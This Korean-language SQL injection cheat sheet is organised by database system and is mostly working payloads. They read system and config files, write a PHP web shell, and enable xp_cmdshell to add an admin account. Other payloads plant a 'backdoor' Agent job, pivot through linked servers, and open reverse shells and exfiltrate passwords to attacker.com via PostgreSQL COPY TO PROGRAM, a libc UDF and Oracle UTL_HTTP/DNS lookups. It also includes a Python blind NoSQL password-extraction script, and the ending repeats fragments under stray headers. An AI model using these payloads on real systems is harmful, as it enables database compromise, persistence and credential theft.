DBMS별 특화 기법

각 데이터베이스 관리 시스템은 고유한 기능과 취약점을 가지고 있습니다. 이 문서에서는 DBMS별 특화된 공격 기법을 다룹니다.

개념 (Concept)​

DBMS별 차이점​

DBMS주석문자열 연결Limit특징
MySQL--, #, /**/CONCAT()LIMIT유연한 문법, FILE 권한
MSSQL--, /**/+TOPxp_cmdshell, Linked Server
PostgreSQL--, /**/||LIMITCOPY, Large Objects
Oracle--, /**/||ROWNUMUTL_HTTP, Java Stored Proc
SQLite--, /**/||LIMITFile-based, 권한 없음

MySQL / MariaDB​

시스템 정보 수집​

버전 정보​

SELECT VERSION()
SELECT @@VERSION
SELECT @@version_comment

출력 예시:

5.7.38-0ubuntu0.18.04.1

현재 사용자​

SELECT USER()
SELECT CURRENT_USER()
SELECT SYSTEM_USER()

현재 데이터베이스​

SELECT DATABASE()
SELECT SCHEMA()

데이터 디렉터리​

SELECT @@datadir

출력: /var/lib/mysql/

권한 확인​

FILE 권한​

SELECT File_priv FROM mysql.user WHERE user='current_user'
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE privilege_type='FILE'

Super 권한​

SELECT Super_priv FROM mysql.user WHERE user=USER()

파일 읽기/쓰기​

LOAD_FILE (파일 읽기)​

기본 사용:

SELECT LOAD_FILE('/etc/passwd')

SQLi 페이로드:

' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT LOAD_FILE('/var/www/html/config.php')--

Windows:

' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini')--
' UNION SELECT LOAD_FILE('C:\\inetpub\\wwwroot\\web.config')--

Hex 인코딩 우회:

# /etc/passwd = 0x2f6574632f706173737764
' UNION SELECT LOAD_FILE(0x2f6574632f706173737764)--

INTO OUTFILE (파일 쓰기)​

웹셸 생성:

' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

데이터 추출:

' UNION SELECT username, password FROM users INTO OUTFILE '/tmp/dump.txt'--

CSV 형식:

SELECT * FROM users INTO OUTFILE '/tmp/users.csv'
FIELDS TERMINATED BY ','
ENCLOSED BY '"'
LINES TERMINATED BY '\n'

우회 기법 (secure_file_priv 제한 시):

# MySQL 5.6+ - secure_file_priv 확인
SELECT @@secure_file_priv

# 빈 값이면 제한 없음
# NULL이면 파일 작업 불가
# 특정 경로면 해당 경로만 허용

Information Schema 활용​

데이터베이스 목록​

SELECT schema_name FROM information_schema.schemata

테이블 목록​

SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()
SELECT table_schema, table_name FROM information_schema.tables

컬럼 목록​

SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT table_name, column_name, data_type FROM information_schema.columns WHERE table_schema=DATABASE()

컬럼 개수 확인 (UNION 공격용)​

SELECT COUNT(*) FROM information_schema.columns WHERE table_name='products'

고급 기법​

GROUP_CONCAT으로 데이터 한 줄에 추출​

' UNION SELECT GROUP_CONCAT(username, ':', password) FROM users--

출력: admin:5f4dcc3b5aa,user1:098f6bcd

BENCHMARK를 이용한 Blind SQLi​

' AND BENCHMARK(10000000, MD5('test'))--

→ CPU 부하로 시간 지연

여러 DB 동시 조회​

' UNION SELECT table_name FROM information_schema.tables WHERE table_schema IN ('db1','db2','db3')--

Microsoft SQL Server (MSSQL)​

시스템 정보 수집​

버전​

SELECT @@VERSION
SELECT SERVERPROPERTY('ProductVersion')
SELECT SERVERPROPERTY('Edition')

현재 사용자​

SELECT USER_NAME()
SELECT SYSTEM_USER
SELECT SUSER_NAME()
SELECT LOGINNAME FROM master..syslogins WHERE sid=SUSER_SID()

현재 데이터베이스​

SELECT DB_NAME()
SELECT name FROM master..sysdatabases

권한 확인​

sysadmin 권한​

SELECT IS_SRVROLEMEMBER('sysadmin')

출력: 1 (sysadmin), 0 (일반 사용자)

db_owner 권한​

SELECT IS_MEMBER('db_owner')

사용자 권한 목록​

SELECT permission_name FROM sys.fn_my_permissions(NULL, 'SERVER')
SELECT * FROM sys.database_permissions WHERE grantee_principal_id=USER_ID()

xp_cmdshell (RCE)​

활성화 확인​

SELECT value FROM sys.configurations WHERE name='xp_cmdshell'

활성화​

EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE

명령 실행​

EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'net user hacker P@ssw0rd /add'
EXEC xp_cmdshell 'net localgroup administrators hacker /add'

SQLi 페이로드:

'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--

OLE Automation (xp_cmdshell 대체)​

xp_cmdshell이 차단된 경우:

DECLARE @output INT
DECLARE @result INT

EXEC sp_oacreate 'wscript.shell', @output OUT
EXEC sp_oamethod @output, 'run', NULL, 'cmd /c whoami > C:\output.txt'

SQLi 페이로드:

'; DECLARE @o INT; EXEC sp_oacreate 'wscript.shell', @o OUT; EXEC sp_oamethod @o, 'run', NULL, 'calc.exe'--

Agent Jobs (지속성)​

스케줄 작업 생성:

USE msdb
EXEC dbo.sp_add_job @job_name='backdoor'
EXEC dbo.sp_add_jobstep @job_name='backdoor', @step_name='execute', @command='net user hacker P@ssw0rd /add'
EXEC dbo.sp_add_jobserver @job_name='backdoor', @server_name='@@SERVERNAME'
EXEC dbo.sp_start_job @job_name='backdoor'

Linked Server (Lateral Movement)​

Linked Server 목록​

SELECT name, data_source FROM sys.servers WHERE is_linked=1
EXEC sp_linkedservers

원격 쿼리 실행​

SELECT * FROM OPENQUERY([LinkedServer], 'SELECT @@version')
EXEC ('SELECT @@version') AT [LinkedServer]

공격 체인:

# Server1 → Server2 → Server3
EXEC ('EXEC (''SELECT @@version'') AT [Server3]') AT [Server2]

시스템 테이블​

테이블 목록​

SELECT name FROM sys.tables
SELECT name FROM sysobjects WHERE xtype='U'

컬럼 목록​

SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')
SELECT col.name, typ.name FROM sys.columns col JOIN sys.types typ ON col.user_type_id=typ.user_type_id WHERE object_id=OBJECT_ID('users')

PostgreSQL​

시스템 정보​

SELECT version()
SELECT current_database()
SELECT current_user
SELECT session_user
SELECT inet_server_addr()  -- 서버 IP
SELECT inet_server_port()  -- 포트

권한 확인​

Superuser 여부​

SELECT current_setting('is_superuser')
SELECT usesuper FROM pg_user WHERE usename=current_user

사용 가능한 함수 목록​

SELECT proname FROM pg_proc WHERE proname LIKE '%pg_%'

파일 읽기/쓰기​

COPY TO/FROM (Superuser 필요)​

파일 읽기:

CREATE TABLE temp(data TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp;

SQLi 페이로드:

'; CREATE TABLE pwn(data TEXT); COPY pwn FROM '/etc/passwd'; SELECT data FROM pwn--

파일 쓰기:

COPY (SELECT 'backdoor') TO '/tmp/test.txt'

COPY TO PROGRAM (RCE)​

Superuser 권한으로 명령 실행:

COPY (SELECT '') TO PROGRAM 'id'
COPY (SELECT password FROM users WHERE username='admin') TO PROGRAM 'curl http://attacker.com/?pass=$(cat)'

Reverse Shell:

'; COPY (SELECT '') TO PROGRAM 'nc attacker.com 4444 -e /bin/bash'--

Large Objects (파일 저장)​

# 파일 가져오기
SELECT lo_import('/etc/passwd', 12345)

# 파일 내보내기
SELECT lo_export(12345, '/tmp/passwd')

# 파일 읽기
SELECT encode(lo_get(12345), 'base64')

UDF (User Defined Functions)​

공유 라이브러리 로드:

CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT

명령 실행:

SELECT system('id')
SELECT system('nc attacker.com 4444 -e /bin/bash')

시스템 카탈로그​

# 데이터베이스 목록
SELECT datname FROM pg_database

# 테이블 목록
SELECT tablename FROM pg_tables WHERE schemaname='public'

# 컬럼 목록
SELECT column_name FROM information_schema.columns WHERE table_name='users'

# 사용자 목록
SELECT usename FROM pg_user

Oracle​

시스템 정보​

SELECT * FROM v$version
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'
SELECT * FROM global_name
SELECT instance_name FROM v$instance
SELECT ora_database_name FROM dual

현재 사용자​

SELECT USER FROM dual
SELECT SYS_CONTEXT('USERENV', 'CURRENT_USER') FROM dual
SELECT SYS_CONTEXT('USERENV', 'SESSION_USER') FROM dual

권한 확인​

# DBA 권한
SELECT * FROM session_privs
SELECT * FROM user_sys_privs

# 테이블 권한
SELECT * FROM user_tab_privs

UTL_HTTP (Out-of-Band)​

# HTTP 요청
SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM dual

# 데이터 추출
SELECT UTL_HTTP.REQUEST('http://attacker.com/?data='||(SELECT password FROM users WHERE ROWNUM=1)) FROM dual

SQLi 페이로드:

' AND UTL_HTTP.REQUEST('http://attacker.com/?pass='||(SELECT password FROM users WHERE username='admin'))='1'--

UTL_INADDR (DNS Exfiltration)​

SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM dual
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com') FROM dual

DBMS_XMLGEN (데이터 추출)​

SELECT DBMS_XMLGEN.GETXML('SELECT username, password FROM users') FROM dual

SQLi 페이로드:

' UNION SELECT DBMS_XMLGEN.GETXML('SELECT username||chr(58)||password FROM users') FROM dual--

Java Stored Procedures​

Java 실행 (강력한 권한 필요):

# Java 클래스 생성
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "Exploit" AS
import java.io.*;
public class Exploit {
    public static String run(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String s = br.readLine();
            return s;
        } catch (Exception e) {
            return e.toString();
        }
    }
}

# 함수 생성
CREATE OR REPLACE FUNCTION run_cmd(cmd VARCHAR2) RETURN VARCHAR2 AS
LANGUAGE JAVA NAME 'Exploit.run(java.lang.String) return java.lang.String';

# 명령 실행
SELECT run_cmd('id') FROM dual

시스템 테이블​

# 테이블 목록
SELECT table_name FROM user_tables
SELECT owner, table_name FROM all_tables

# 컬럼 목록
SELECT column_name FROM user_tab_columns WHERE table_name='USERS'

# 사용자 목록
SELECT username FROM all_users

SQLite​

시스템 정보​

SELECT sqlite_version()
SELECT * FROM sqlite_master WHERE type='table'

테이블 목록​

SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE type='table'  -- CREATE TABLE 문 확인

제약 사항​

SQLite는:

  • 파일 기반 (별도 서버 없음)
  • 권한 개념 없음
  • RCE 불가능
  • Out-of-Band 불가능

주로 Local File Inclusion과 결합:

# SQLite DB 파일 읽기
http://example.com/?file=../../database.db

MongoDB (NoSQL)​

MongoDB는 NoSQL이지만 SQL Injection과 유사한 공격 가능

NoSQL Injection​

인증 우회​

JSON 페이로드:

{
  "username": {"$ne": null},
  "password": {"$ne": null}
}

URL 인코딩:

username[$ne]=null&password[$ne]=null

비교 연산자​

{"$gt": ""}   // Greater than
{"$gte": ""} // Greater than or equal
{"$lt": ""}   // Less than
{"$lte": ""}  // Less than or equal
{"$ne": ""}   // Not equal
{"$in": []}   // In array
{"$nin": []}  // Not in array

Regex 공격​

{
  "username": {"$regex": "^admin"},
  "password": {"$regex": "^a"}
}

Blind Injection으로 비밀번호 추출:

import requests
import string

url = "http://example.com/login"
password = ""
charset = string.ascii_letters + string.digits

for i in range(1, 50):
    for c in charset:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{c}"}
        }
        r = requests.post(url, json=payload)

        if "success" in r.text:
            password += c
            print(f"[+] Password: {password}")
            break
    else:
        break

print(f"[+] Final password: {password}")

# 시스템 정보

PostgreSQL​

# 시스템 정보
SELECT version(), current_database(), current_user

# 파일 읽기
COPY (SELECT '') TO PROGRAM 'cat /etc/passwd | curl http://attacker.com -d @-'

# RCE
COPY (SELECT '') TO PROGRAM 'nc attacker.com 4444 -e /bin/bash'

# UDF
CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'c' STRICT

# 시스템 정보
SELECT banner FROM v$version WHERE ROWNUM=1
